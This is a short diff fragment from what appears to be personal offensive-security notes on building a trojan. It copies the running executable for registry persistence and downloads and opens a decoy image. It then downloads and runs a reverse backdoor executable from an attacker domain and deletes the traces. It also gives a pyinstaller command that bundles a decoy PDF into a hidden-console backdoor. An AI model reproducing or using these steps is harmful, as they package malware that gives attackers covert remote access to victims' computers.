@@ -588,6 +588,24 @@ if not os.path.exists(evil_file_loaction):
         shutil.copyfile(sys.executable,evil_file_loaction)    # __file__ as source if we were using the .py file itself instead of to be packaged exe
         subprocess.call()  # put the reg add command with evil_file_location
 
+trojan looks and functions like a normal file like pdf,jpeg etc the target is expecting + executing the evil file at the backend.
+tmp = tempfile.gettempdir()
+os.chdir(tmp)
+download('path/to/car.jpg')
+subprocess.Popen('car.jpg')   # to keep running in bakground and allow lazagne to run simultaneoulsy
+download('path/to/rev_bacldoor.exe')
+subprocess.call('rev_bacldoor.exe') # does not want to background since the command should allow remove in next steps once hacker quits
+os.remove('car.jpg')
+os.remove('rev_bacldoor.exe')
+
+but again the above requires that the target has an internet connection and the attacker has a domain to get the requests.
+better option is to package the jpg/pdf along with the packaged exe. its easy with pyinstaller in wine.
+wine full/path/to/pyinstaller.exe --add-data "path/to/pdf:." --onefile --noconsole rev_backdoor.py  # pdf is what is shown to user while execution
+
+
+
+
+
 
 
    
